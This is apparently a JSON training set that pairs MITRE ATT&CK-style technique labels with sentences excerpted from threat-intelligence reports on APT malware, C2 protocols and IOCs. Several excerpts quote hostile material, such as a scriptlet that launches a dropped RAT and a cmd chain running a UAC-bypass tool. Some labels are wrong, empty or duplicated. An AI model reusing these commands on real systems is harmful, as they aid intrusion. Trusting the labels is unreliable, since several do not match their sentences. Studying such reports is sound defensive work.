{
    "drive-by compromise": [
        "From these reports, we know that the group uses an abundance of tools and tactics, ranging across zero-day exploits targeting common applications such as Java or Microsoft Office, heavy use of spear-phishing attacks, compromising legitimate websites to stage watering-hole attacks, and targeting over a variety of operating systems \u2013 Windows, OSX, Linux, even mobile iOS",
        "We believe this access was abused, for example, by inserting malicious scripts in the country\u2019s official websites in order to conduct watering hole attacks",
        "What does the resulting watering hole look like? The websites were compromised to redirect visitors to instances of both ScanBox and BEeF",
        "This targeting of third party organizations to attack further targets is a risky move on the attackers\u2019 part, as it potentially reveals their activity within the compromised third party organizations to the new target (those receiving the malicious documents  Making sense of MuddyWater When we looked at the cluster of activity which consisted of what appeared to be espionage-focused attacks in the Middle East, we were somewhat confused as the previous public reporting had attributed these attacks to FIN7",
        "Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks",
        "Malefactors used watering hole attacks to compromise legitimate and trusted websites frequently visited by their targets",
        "The payload delivered in these November 2017 attacks using DDE enabled documents was SofacyCarberp, which differs from the Zebrocy downloader delivered in the February 2018 attacks",
        "Like many threat groups, TG-3390 conducts strategic web compromises (SWCs), also known as watering hole attacks, on websites associated with the target organization's vertical or demographic to increase the likelihood of finding victims with relevant information",
        "[2] Threat groups use strategic web compromises (SWCs), also known as watering hole attacks, to target a wide array of potential victims",
        "Threat actors compromise a website used by their target demographic (e.g., compromising a website specializing in oil and gas industry news when targeting the energy vertical)"
    ],
    "system information discovery new service service execution-multi": {
        "technique_names": [
            "system information discovery",
            "new service",
            "service execution"
        ],
        "sentances": [
            "Summary information for the three binaries we analyzed follows:    MD5 364ff454dcf00420cff13a57bcb78467   SHA-256 8bca0031f3b691421cb15f9c6e71ce19335 5d2d8cf2b190438b6962761d0c6bb   ssdeep 3072:n+1R4tREtGN4qyGCXdHPYK9l0H786 O26BmMAwyWMn/qwwiHNl:n+1R43QcIL XdF0w6IBmMAwwCwwi   Size 141.2 KB (144560 bytes)   Type ELF 64-bit (stripped)   Install as root /bin/rsyncd   Root install desc synchronize and backup service   Install as non-root ~/.config/dbus-notifier/dbus-inotifier   Non-root install desc system service d-bus notifier   C2 azureon-line[.]com (TCP/80)   Usage Timeframe Late 2014    Table 1: Sample 1 \u2013 Late 2014 Sofacy 64-bit Fysbis    MD5 075b6695ab63f36af65f7ffd45cccd39   SHA-256 02c7cf55fd5c5809ce2dce56085ba43795f2 480423a4256537bfdfda0df85592   ssdeep 3072:9ZAxHANuat3WWFY9nqjwbuZf454U NqRpROIDLHaSeWb3LGmPTrIW33HxIajF: 9ZAxHANJAvbuZf454UN+rv eQLZPTrV3Z   Size 175.9 KB (180148 bytes)   Type ELF 32-bit (stripped)   Install as root /bin/ksysdefd   Root install desc system kernel service defender   Install as non-root ~/.config/ksysdef/ksysdefd   Non-root install desc system kernel service defender   C2 198.105.125[.]74 (TCP/80)   Usage Timeframe Early 2015    Table 2: Sample 2 \u2013 Early 2015 Sofacy 32-bit Fysbis    MD5 e107c5c84ded6cd9391aede7f04d64c8   SHA-256 fd8b2ea9a2e8a67e4cb3904b49c789d57ed 9b1ce5bebfe54fe3d98214d6a0f61   ssdeep 6144:W/D5tpLWtr91gmaVy+mdckn6BCUd c4mLc2B9:4D5Lqgkcj+   Size 314.4 KB (321902 bytes)   Type ELF 64-bit (not stripped)   Install as root /bin/ksysdefd   Root install desc system kernel service defender   Install as non-root ~/.config/ksysdef/ksysdefd   Non-root install desc system kernel service defender   C2 mozilla-plugins[.]com (TCP/80)   Usage Timeframe Late 2015    Table 3: Sample 3 \u2013 Late 2015 Sofacy 64-bit Fysbis Overall, these binaries are assessed as low sophistication, but effective",
            "Once Shellex is called, it first passes each of the items in the config buffer to their own strings.\u00a0 Next, it creates a mutex using the filename and checks to see if the Service key for the service name exists.\u00a0 If so, it opens it using service manager.\u00a0 If not, it first saves a copy of itself to %Program Files (x86)%/DIFXE/svchost.exe.\u00a0 Next, it creates the service and runs it.\u00a0 Once the service is running, it creates a new mutex using [C2URL]:[PORT] and connects to the C2 server.\u00a0 It then sends the Implant_Heartbeat opcode, and then calls its payload function to grab  Version Information (x86 and x64) Host information SystemInfo Processor Count and Write Speed Global Memory Status  before formatting it, altering the InstallTime subkey, and sending all of the information back to its C2 in the Implant_Login buffer"
        ]
    },
    "command-line interface": [
        "This is followed by a number of Linux shell command style commands related to the malware establishing persistence",
        "The malware\u2019s capabilities include taking a system survey, access to the filesystem, executing commands and a reverse shell",
        "This indicates that a human operative was executing commands on a command line style interface, rather than an automated or GUI process",
        "Although MURKYTOP is primarily a command-line reconnaissance tool, it can also be used for lateral movement",
        "The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders",
        "Tracked Commands During observation of the described above \u201crouter-PC\u201d CnC we tracked the following commands delivered in the config file before the server went offline",
        "After decryption, these 34 commands are plain text with parameters that are space delimited much like a command line",
        "The command and parameter names are hashed before being compared by the binary, making it difficult to recover the original names of commands and parameters",
        "These commands are also executed when the loadconfig command is issued",
        "The loadconfig and state commands are executed during initialization, effectively creating the configuration file if it does not exist and writing the state command to it",
        "The command tab will show previously issued commands, when they were issued, and their status, as seen in Figure 4",
        "Glimpse\u2019s Agent Control Panel showing the interface actors would use to send commands The actor clicks the command to view the results in a popup window named \u201cResult Viewer\u201d",
        "Figure 7 shows just how similar these two batch scripts are with several of the headers being exactly the same and a majority of the commands being the same with the Helminth commands having the 2>&1 suffix to include command errors with the output",
        "This script relays commands and output between the controller and the system",
        "The threat actors used the appcmd command-line tool to unlock and disable the default logging component on the server (systsm.webServer/httplogging) and then delete existing logs from the system (see Figure 4)",
        "RemoteCMD: This tool executes commands on remote computers, similar to the PsExec tool",
        "These are in-line with the targeting of the victims witnessed by the attackers using Conmie",
        "Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan",
        "Gather network addresses and operating system version Execute arbitrary commands using \u201ccmd.exe /c\u201d  The capability to execute system commands",
        "Figure 3: ALFA TEaM Shell v2-Fake Mail (Default) Figure 4 shows an example email containing the default values the shell",
        "Remexi is a basic back door Trojan that allows attackers to open a remote shell on the computer and execute commands",
        "Though this is unsophisticated, a remote shell does provide a highly flexible and powerful means of remote access in the hands of a skilled attacker",
        "!CMD  Trojan executes a command prompt command",
        "The Trojan will save the output of the command to %TEMP%\\win<random number>.txt and send the contents to the C2 server or \u201cThe length of Cmd result file is ziro!\u201d if the command was unsuccessful",
        "Both variants need to be executed with the command line argument \u201c[2]\u201d to avoid continually attempting to copy and execute the Trojan using the \u201ctmp.vbs\u201d and \u201ctmp1.vbs\u201d files",
        "The Visual Basic macro uses the following command line:  cmd /c expand %TEMP%\\setup.cab -F:* %TEMP% && cd /d %TEMP% && del /f /q setup.cab && uacme.exe  The control server credential information contained in the CAB files is different:   Decoded credential data contained in another ipnet.ini",
        "/user <parameters>: Executes downloaded file with parameters specified using CreateProcessAsUser cmd /c <command>: Executes command on infected endpoint\u00a0  Conclusion\u00a0 The actor behind Honeybee has been operating with new implants since at least November 2017 with the first known version of NTWDBLIB installer",
        "Remote Shell:  The function above is seen throughout many of the binaries in the Mirage family and is executed when a command is sent from the C&C",
        "It is responsible for executing commands in cmd.exe (later down in the functions, not seen in the screenshot, it looks for cmd.exe and executes it using CreateProcessA)",
        "This ID is sent to the CnC with each request for commands to execute",
        "Supported commands \u201cupload\u201c, \u201cscreenshot\u201c, \u201cExcel\u201c, \u201cOutlook\u201c, \u201crisk\u201c, \u201creboot\u201c, \u201cshutdown\u201c, \u201cclean\u201c",
        "Both create one thread, and each thread is responsible for either downloading and executing the file or running a command line program in the terminal:   Figure 28.\u00a0Commands used for downloading and executing, and running a command in terminal   Figure 29.\u00a0Commands used in uploading and downloading file Figure 30",
        "Traps provides endpoint protection, as it can block Excel from creating a command prompt process",
        "For instance, this Trojan uses the InternetExplorer application object much like the previous OopsIE Trojan and a very similar sequence of requests to obtain commands",
        "cmd.exe /C choice /C Y /N /D Y /T 2 & Del After sleeping, the Trojan will create a GUID and write it to %APPDATA%\\Windows\\GDI.bin",
        "Otherwise, the Trojan will attempt to parse the response for a command, specifically by splitting the decode response on <> and treating the text to the left of the <> string as the command the text to the right as the command arguments",
        "The run command (1) creates the process cmd.exe /c with the command parameters appended and will write the output of the command in hexadecimal format to the file %APPDATA%\\tmpCa.vbs",
        "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute any scripts/commands and receive the result via HTTP requests",
        "The malware basically provides a remote CMD/PowerShell terminal for the attackers, enabling them to execute scripts/commands and receive the results via HTTP requests",
        "<?XML version=\u201d1.0\u2033?> <scriptlet> <registration description=\u201dfjzmpcjvqp\u201d progid=\u201dfjzmpcjvqp\u201d version=\u201d1.00\u2033 classid=\u201d{204774CF-D251-4F02-855B-2BE70585184B}\u201d remotable=\u201dtrue\u201d > </registration> <script language=\u201dJScript\u201d> <![CDATA[ var r = new ActiveXObject(\u201cWScript.Shell\u201d).Run(\u201ccmd /c %tmp%\\\\qrat.exe\u201d,0,false); exit(); ]]> </script> </scriptlet> After the initial dropper (qrat.exe) has been executed by the embedded scriptlet, it creates a directory in C:\\Users\\%username%\\AppData\\Roaming\\Microsoft Network\\microsoft_network\\1.0.0.0 and unpacks/drops the final QuasarRAT binary named microsoft_network.exe",
        "C2 communication is also updated from prior versions, with the following commands now supported by BADNEWS:    Command Description   0 Kill BADNEWS",
        "Access remote objects interactively from the pupy shell and get auto-completion of remote attributes",
        "Execute noninteractive commands on multiple hosts at once",
        "Open interactive python shells with auto-completion on the all-in-memory remote python interpreter",
        "Interactive shells (cmd.exe, /bin/bash, etc) can be opened remotely",
        "Remote shells on Unix & Windows clients have a real tty with all keyboard signals working just like an SSH shell",
        "Figure 1: SpeakUp\u2019s Victim Distribution  Figure 2: SpeakUp\u2019s propagation rate per day Infection Vector The initial infection vector is targeting the recently reported vulnerability in ThinkPHP and uses command injection techniques for uploading a PHP shell that serves and executes a Perl backdoor",
        "Figure 6: SpeakUp receives additional commands to execute, this time in plain text",
        "Command\u00a0execution Command execution can create havoc for victim if the malware developer decides to execute commands in the victim\u2019s device",
        "BADFLICK: a backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command and control (C2) configuration",
        "MURKYTOP: a command-line reconnaissance tool",
        "The malware supports several capabilities, such as injecting and executing arbitrary code, uploading and downloading files, and executing shell commands",
        "The summit is the latest in a line of signs of diplomatic outreach from North Korea, following the Panmunjom Declaration for Peace, Prosperity and Unification of the Korean Peninsula between South Korea and North Korea on April 27, 2018",
        "It is used to create new processes, perform as a command line shell, and several other tasks",
        "The starred commands are undocumented commands",
        "Its presence on a compromised system allows a threat actor to execute a wide variety of commands, including uploading and downloading files, and spawning a reverse shell",
        "UserInstall.exe will abuse the BITSadmin command-line tool to create a job and launch sidebar.exe",
        "This parameter transmits the agent_id to the C2 server to obtain commands the actor wishes to execute on the compromised system",
        "We analyzed the command handler and found that it provided the necessary commands for a fully functional backdoor, as seen in Table 1",
        ""
    ],
    "obfuscated files or information": [
        "Figure 2: Sofacy Fysbis capability related leakage through strings Figure 2 shows interactive status / feedback strings that can give a defender an initial profile of capabilities",
        "For comparison, if we were to inspect Fysbis \u201cRemoteShell\u201d associated strings in one of the stripped variants, we would only see the following:  Figure 3: Sofacy Fysbis stripped binary string references to RemoteShell capability Compare this with what is available from the non-stripped variant:  Figure 4: Sofacy Fysbis non-stripped binary strings referenes to RemoteShell capability Little static analysis gifts like these can help to speed defender enumeration of capabilities and \u2013 more importantly \u2013 further contribute to correlation and detection across related samples",
        "That malicious dll then loads encrypted shellcode from the binary, which is decrypted and runs the final BUGJUICE payload",
        "Messages are encrypted using AES with a static key",
        "The 2.0 versions require a dropper to decipher and launch the AES encrypted QUASARRAT payload",
        "After the payload is launched, the shellcode runs the following commands to prevent Microsoft Word from showing a recovery dialog:   Lastly, the shellcode overwrites the malicious file with a decoy document related to the Indian defense forces\u2019 pay scale / matrix (Figure 3), displays it to the user and terminates the exploited instance of Microsoft Word",
        "The code is obfuscated in order to hide any malicious activity on the remote server",
        "Bxaki obfuscated function",
        "This strangeness\u00a0was related to values listed in newer\u00a0BlackEnergy configuration files",
        "Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below)",
        "Destructive dstr command in BE2 config file Also, on some machines, documents were encrypted, but no related\u00a0plugin could be\u00a0found",
        "It is prepended to the encrypted and encoded message",
        "The headers are XOR encrypted with <hdrXORKey1> and <hdrXORKey2> combined and reversed",
        "Build Tool Most of CARBANAK\u2019s strings are encrypted in order to make analysis more difficult",
        "This build tool encrypts the binary\u2019s strings with a fresh key for each build",
        "Tool Type Internal Name Industry Name   Backdoor Poison Frog BONDUPDATER   Backdoor Glimpse Updated BONDUPDATER   Webshell HyperShell TwoFace loader   Webshell HighShell TwoFace payload   Webshell Minion TwoFace payload variant   DNS Hijacking Toolkit webmask Related to DNSpionage     Table 1",
        "The HyperShell and HighShell webshells are variants of what we track as TwoFace, with HyperShell being related to the TwoFace loader and HighShell being related to the TwoFace payload, as we reported in July 2017",
        "Encryption consists of XOR with a hardcoded key for its configuration and RC4 with a predefined password for encrypting the victim\u2019s data",
        "Configuration Config.ini is the file where the malware stores its encrypted configuration data",
        "These requests are encrypted using the RC4 algorithm",
        "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload",
        "Figure 3 Targeted lure content In one of the documents, the victim is presented with what appears to be an obfuscated document with the NATO EOD seal and text alluding to the targeted nation state",
        "The group clearly shows a preference for using a simple downloader like Zebrocy as first-stage payloads in these attacks",
        "APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property",
        "When we converted the dates in the file strings from the Solar Hijri calendar to the Gregorian one, we found that they were close to the compilation times of the executables and also close to when Cadelle\u2019s targets were initially compromised",
        "WindowsDefender.ini \u2013 The Base64 encoded and obfuscated PowerShell script",
        "Some of the key obfuscation techniques used are:   Character Replacement: Several instances of character replacement and string reversing techniques (Figure 10) make analysis difficult",
        "Figure 3: The first step of decryption will perform XOR on one byte using the previous adjacent byte, starting from the last byte and excluding the first byte  Figure 4: The second step uses RC4, using the first 0x20 bytes from the result of the first step as the RC4 key  Figure 5: Encrypted (Top) and decrypted (bottom) configuration file It is also important to note that while the loader component and the configuration file are located in the same directory (%windows%\\system32), the encrypted backdoor is located in a different directory (%Program Files%\\Common Files\\System\\ado)",
        "All strings used by the Trojan are encrypted with the XOR algorithm",
        "Next, the buffer is encrypted using the RC4 algorithm with the 50-byte key (also stored in the backdoor\u2019s body)",
        "11 bytes of this buffer are encrypted with the XOR algorithm as follows: i = 0 while ( 1 ) {   crypted_buffer = (_BYTE *)this_->crypted_buffer;   if ( i gt;= this-gt;crypted_buffer_size - 4 ) // this-gt;crypted_buffer_size == 15     break;   ++i;   crypted_buffer[i + 4] ^= crypted_buffer[i & 3];  The generated buffer in encoded using the BASE64 alphabet, where the last two characters are replaced with \u201c-\u201d and \u201c_\u201d",
        "Next, to the beginning of the BASE64 string a random BASE64 string with the length of 5 characters is added",
        "The first 11 bytes of the received buffer are encrypted with the XOR algorithm",
        "Once it is encrypted using the XOR algorithm, the buffer is encoded with BASE64",
        "The launcher module, obfuscated with the notorious Metasploit\u2019s shikata_ga_nai encoder, is the same for all the droppers",
        "These redirects were implemented by adding two malicious scripts obfuscated by a tool similar to the Dean Edwards packer",
        "Many of the Fetch samples we analyzed attempted to obfuscate their functionality by encrypting their embedded strings using AES",
        "Although the activity was previously linked by others to the FIN7 threat actor group, our research suggests the activity is in fact espionage related and unlikely to be FIN7 related",
        "Specifically, the following GitHub repositories appear to be controlled by the MuddyWater threat actor(s):  [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/ArabicBrowserFont.exe   [unknown SHA256]  Downloads payload from: hxxps://raw.githubusercontent[.]com/F0R3X/BrowserFontArabic/master/FontArabic.exe     9b5e36bb7518a9e333c31d09b589102f89e3425571dd434820ab3c437dc4e0d9 (and several others)  Downloads payload from: hxxps://raw.githubusercontent[.]com/ReactDeveloper2017/react/master/src/test/test.js    Interestingly, both profiles were populated with forked repositories to give them an air of legitimacy as shown in figure 2",
        "The domain names differed but the script adheres to the same logic (including the logic function).\u201d The DNSMessenger malware is an obfuscated and customized version of the popular DNS_TXT_PWNAGE.ps1 script available on GitHub and is also referred to by FireEye as POWERSOURCE",
        "Malicious obfuscated VBA code is executed when the macro is first enabled",
        "The current version, HawkEye Reborn v9 has been modified from earlier versions and heavily obfuscated to make analysis more difficult.The email campaigns that have been observed feature characteristics that are consistent with what is commonly seen with malspam campaigns, with the emails purporting to be associated with various documents such as invoices, bills of materials, order confirmations, and other corporate functions",
        "After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works",
        "The AutoIT script is offering a lot of other functions which are not used in this campaign, like anti-virtual machine detection, USB drive infection and others.The final payload \u2014 which we found in the AutoIT PE file resource section and was started by the process-hollowing shellcode \u2014 is a .NET PE file that's obfuscated with ConfuserEx",
        "In our analysis, the macro is obfuscated, character by character, using the decimal ASCII code",
        "Code snippet of the obfuscated document After deobfuscation, we can see that the payload is written in the Perl programming language",
        "There are two forms of encrypted strings: an RSA256-encrypted string, and custom base64-encoded and RSA256-encrypted string",
        "All strings below are encrypted via AES256 and base64 encoding",
        "Its developer used the open source Invoke-Obfuscation tool to obfuscate this PowerShell script, specifically using the COMPRESS technique offered by Invoke-Obfuscation",
        "At face value, this current variant of OopsIE has a vast majority of its strings obfuscated, which can be deobfuscated by splitting the strings using the hyphen as a delimiter, treating each split value as an integer, subtracting one from each integer and converting each into a character",
        "The Trojan accesses two resources, named Sch and VBS that contains obfuscated strings that contain the command to create the scheduled task and the VBScript to run",
        "A closer examination revealed the obfuscation used by the OilRig group in these QUADAGENT samples were likely the result of using an open-source toolkit called Invoke-Obfuscation",
        "This tool was originally intended to aid defenders in simulating obfuscated PowerShell commands to better their defenses",
        "Invoke-Obfuscation calls the variable obfuscation technique used by the actors to obfuscate this script Random Case + {} + Ticks, which changes all variables in the script to have randomly cased characters, to be surrounded in curly braces and to include the tick (`) character, which is ignored in by PowerShell",
        "Invoke-Obfuscation calls the string obfuscation used by the actors to further obfuscate this script Reorder, which uses the string formatting functionality within PowerShell to reconstruct strings from out of order substrings (ex",
        "By applying two specific obfuscation techniques within Invoke-Obfuscation, we were able to create an obfuscated PowerShell script that was very similar to the QUADAGENT payloads delivered in the attacks discussed in this blog",
        "All the strings and settings were encrypted and obfuscated",
        "The configuration and strings are encrypted using 3DES and Base64 encoding",
        "The C&C server then replies with the encrypted serialized configuration",
        "The shellcode is not encrypted but is obfuscated",
        "Decrypting the Configuration As previously mentioned, the real configuration data is stored in the first stage shellcode but it is not stored in cleartext, but encrypted and compressed",
        "The configuration data is encrypted with the same algorithm described previously by JPCert but using a different XOR value",
        "The configuration blob is encoded using a simple single-byte XOR scheme",
        "KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",
        "The payload (abbad7acd\u2026) is an executable that appears to have been created by a VBScript to Executable tool and further obfuscated with a cryptor",
        "Figure 3: no detections for SpeakUp in Virus Total In an attempt to endure the investigation process by security researchers, the second stage payload was encoded with salted base64",
        "Some strings are obfuscated with XOR x56",
        "These files are stored within an 217kb encrypted cab file in the dropper\u2019s resources under the name \u201cA\u201d",
        "The cab file was encrypted and decrypted using a simple xor cipher with a rotating 16 byte key: \\x36\\x11\\xdd\\x08\\xac\\x4b\\x72\\xf8\\x51\\x04\\x68\\x2e\\x3e\\x38\\x64\\x32",
        "This is encrypted by RC4, using the key {0xb5, 0x78, 0x62, 0x52, 0x98, 0x3e, 0x24, 0xd7, 0x3b, 0xc6, 0xee, 0x7c, 0xb9, 0xed, 0x91, 0x62}",
        "We\u2019ve identified two such files: settings.db sdfg3d.db Here\u2019s how such a database file appears:  These are BASE64 encoded and use the same RC4 encryption key as the malware configuration",
        "The CARROTBAT malware family is a somewhat unique dropper and while it supports various types of decoy documents, and employs rudimentary command obfuscation, it should be made clear that it is not sophisticated",
        "Embedded Trojan This Trojan loaded by the first payload contains several embedded executables that it uses to ultimately download and execute a secondary payload, as well as downloading and opening a decoy document",
        "HttpBrowser's executable code may be obfuscated through structured exception handling and return-oriented programming",
        "Navigating to the web page manually to view:source reveals the code, which at the time of writing happened to not be obfuscated in any significant way",
        "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",
        "Figure 7: The same de-obfuscated code as Figure 2 The only other script content of the blog-page[.]html is an empty script section",
        "All third-party trademarks referenced by Cofense whether in logo form, name form or product form, or otherwise, remain the property of their respective holders, and use of these trademarks in no way indicates any relationship between Cofense and the holders of the trademarks",
        "PlayList.vbs contains the obfuscated codes, which it executes after decrypting the obfuscations.",
        "Once executed, Vcrodat loads an encrypted payload on to the victim\u2019s computer.",
        "",
        "Figure 3\u00a0shows this webshell\u2019s code that will run supplied JScript provided in base64 encoded format within the URL within a parameter",
        "",
        "",
        "The file uses a character insertion obfuscation technique, making it appear to contain Chinese characters.",
        "The JavaScript is heavily obfuscated. The first variable\u2014a\u2014is an array of obfuscated values",
        "This shellcode is decrypted in memory through EQENDT32.EXE",
        "The encrypted file contains a config file of 0x78 bytes. The data is decrypted with an 0xD9 XOR operation.",
        "The \"Blackwater.bas\" macro was obfuscated using a substitution cipher whereby the characters are replaced with their corresponding integer.",
        "The actors have made some small changes, such as altering the variable names to avoid Yara detection",
        "To operate and evade standard analysis tools, most of the functions are hashed",
        "Note that every string is decrypted with different XOR parameter which may fail some of the automatic analyzers."
    ],
    "custom cryptographic protocol": [
        "Figure 6: Assembly view of Sample 3 root installation related byte arrays As it turns out, the referenced byte mask is applied to the other byte arrays using a rolling double-XOR algorithm to construct malware installation paths, filenames, and descriptions for a Linux root account",
        "The encryption/decryption routine (refer to Figure 5) can be summarized as follows:      Figure 5: Encryption/ Decryption Function  Generate an array of integers from 0x00 to 0xff Scrambles the state of the table using the given key Encrypts or decrypts a string using the scrambled table from (b)",
        "Version 2 Rather than using the host ID as the key, this version uses a random XOR key between 32 and 64 bytes in length that is generated for each session",
        "A build tool is likely being used by these attackers that allows the operator to configure details such as C2 addresses, C2 encryption keys, and a campaign code",
        "After applying this decryption algorithm, we are presented with the following data: h=HOSTNAME-PC&f=mission.ini&c=& The response made by the C2 server uses the same RC4 key for encryption",
        "The BONDUPDATER script, which was named based on the hard-coded string \u201cB007\u201d, uses a custom DGA algorithm to generate subdomains for communication with the C2 server",
        "Figure 9: Example Network Communication In the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response",
        "The structure of each of these outbound DNS requests is as follows: <system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain> The payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2",
        "The C2 server will provide the pre-shared key within the response data and will provide the session ID value via the Set-Cookie field within the response, specifically the string after the PHPSESSID parameter of the cookie",
        "<encoded system data>.<same random number between 100000 and 999999 above>.<c2 name> \u00a0 After obtaining a session ID and pre-shared key, the PowerShell script will continue to communicate with its C2 server to obtain data to treat as a command",
        "Instead, it immediately issues a query to resolve the following domain, which embeds the session ID value to transmit it to the C2: \u00a0 <encoded session id>.<same random number between 100000 and 999999>.<c2 domain name> \u00a0 To transmit the data via the DNS tunneling, the C2 server will respond to the above query with an IPv6 address that contains the number of DNS queries the payload must issue to obtain the entirety of the data from subsequent IPv6 answers",
        "The script will send the specified number of DNS queries using the following format, each of which the C2 will respond with an IPv6 address that the script will treat as a string of data: \u00a0 www.<sequence number>.<same random number between 100000 and 999999>.<c2 domain name> \u00a0 The payload will treat the data provided by the C2 as a message, which will have the following structure: \u00a0 hello<char uuid[35]><char type[1]><data> \u00a0 The message will start with the string hello followed by a 35-character UUID string"
    ],
    "system network configuration discovery": [
        "Neither this new domain nor the IP it resolves to have been observed in the past, indicating that the sample in Table 3 may be associated with a newer campaign",
        "Table 4: URL parameters Additionally, the command string is hashed using the same RGPH hashing algorithm as before",
        "Analysis of the domains and IP address infrastructure used by APT15 identified a number of similar possible domains, shown at the bottom of the post",
        "In one instance, a log file recovered from an open indexed server revealed that an IP address (112.66.188.28) located in Hainan, China had been used to administer the command and control node that was communicating with malware on victim machines",
        "APT40 used MURKYSHELL at a compromised victim organization to port scan IP addresses and conduct network enumeration",
        "In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain",
        "Instructions within guide.txt explaining how to carry out DNS hijacking attack In one part of guide.txt, an example target appears to be provided, with a corresponding adversary IP (185.162.235[.]106) for the legitimate domain to be redirected to",
        "By running SSH on the server in a compromised network, attackers can come back to the network whenever they want",
        "Note that IP addresses can be reallocated",
        "Backdoor.Pirpi also collects information about the target\u2019s local network, including the domain controller and workstations",
        "It also gathers network information such as the MAC address, IP address, WINS, DHCP server, and gateway",
        "Regular Expressions   ([^r-v\\\\s])[r-v]([\\\\w\\\\d+\\\\/=]+)-\\\\w+.(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,4}[\\\\w|:]+){1,8})   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8})   ([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   (\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)   Address:\\\\s+(\\\\d+.\\\\d+.\\\\d+.\\\\d+)    Table 3 Regular expressions used by RogueRobin The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers",
        "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123",
        "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure",
        "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organization\u2019s name",
        "After the second DLL is loaded into memory, the first DLL overwrites the IP address for the control server, effectively changing the address the malware will communicate with",
        "DHS and FBI are distributing these IP addresses to enable network defense activities and reduce exposure to the DDoS command-and-control network",
        "FBI has high confidence that HIDDEN COBRA actors are using the IP addresses for further network exploitation.This alert includes technical indicators related to specific North Korean government cyber operations and provides suggested response actions to those indicators, recommended mitigation techniques, and information on reporting incidents to the U.S",
        "If Adobe Flash or Microsoft Silverlight is no longer required, DHS recommends that those applications be removed from systems.The IOCs provided with this alert include IP addresses determined to be part of the HIDDEN COBRA botnet infrastructure, identified as DeltaCharlie",
        "DHS and FBI recommend that network administrators review the IP addresses, file hashes, network signatures, and YARA rules provided, and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization.When reviewing network perimeter logs for the IP addresses, organizations may find numerous instances of these IP addresses attempting to connect to their systems",
        "The IP address in the lateral movement techniques was substituted with the local machine IP address to achieve code execution on the system",
        "When we analyzed the email headers, we determined that the email was sent from an SMTP server using an IP associated with the Yonsei University network",
        "text=  from=  ai= ags=  oe= aq= btnG=  oprnd=  ai= utm=  channel=  The page address in the domain of the command and control server is chosen randomly from the list",
        "Analysis of their configurations show that the C2 servers used both fully-qualified domain names and IP addresses",
        "The Retriever Trojan uses the following namespace: using pcchekapp.grp.ammar.samaneh; Android.The malware begins by creating a web service object and uses the following URL within its configuration: http:// service.chrome-up[.]date:8080 /WebService.asmx It then calls a function called \u201cSetLog2\u201d, which sets variables for the system\u2019s IP address, MAC address and hostname",
        "The code will gather some information about the system, specifically the local IP address, MAC address, and the external IP address of the system",
        "Similar to Reaver as posted by Palo Alto, it gets the IP or domain of the C&C server, the port, name of the binary, a sleep timer, and what Palo Alto calls a \u201ccampaign identifier.\u201d Technical Details At this moment, we were unable to retrieve the original infection vector and other information regarding what other tools the APT15 group is using to attack their targets",
        "Victim system reconnaissance The code then tries to obtain the victim\u2019s public IP via \u201chttps://api.ipify.org/\u201d",
        "The public IP is then POSTed along with OS Version, Internal IP, Machine Name, Domain Name, UserName after being encrypted to the previously chosen URL to register a new victim",
        "If the first resolved domain IP address starts with 24.125.X.X, then it is set to 1",
        "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure",
        "The email address is associated with the Lebanese domain of a major global financial institution",
        "Inspecting the class C network for 185.162.235.0/24 shows us that another IP on the same network resolves to an OilRig domain, msoffice-cdn[.]com which we identified in August 2017",
        "The malware then requests a connection to 192.184.60.229 on TCP port 81 using the command \"05 01 00 01 c0 b8 3c e5 00 51\" and verifies that the first two bytes from the server are \"05 00\" (c0 b8 3c e5 is the IP address and 00 51 is the port in network byte order)",
        "The chinapolicyanalysis.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
        "The mericcs.org domain was used as the sender address, as well as the hosting location of the malicious RTF document",
        "The structure of the domain mimics the Mercator Institute for China Studies (MERICS), whose actual domain is merics.org",
        "Network Indicators\u200b     Hostname IP Address Notes   mailcenter.support 221.121.138.139 Domain used to for sending spear phishes and user tracking",
        "chinapolicyanalysis.org 185.130.212.168 Domain used for spear phish sender e-mail address and to host malicious documents",
        "fprii.net 185.130.212.254 Domain used for spear phish sender e-mail address and to host malicious documents",
        "mericcs.org 221.121.138.141 Domain used for spear phish sender e-mail address and to host malicious documents",
        "In February 2018, several KHRAT associated domains began resolving to the IP address 89.46.222[.]97",
        "Examining passive DNS (pDNS) records from PassiveTotal revealed several domain names associated with this IP that mimic popular technology companies",
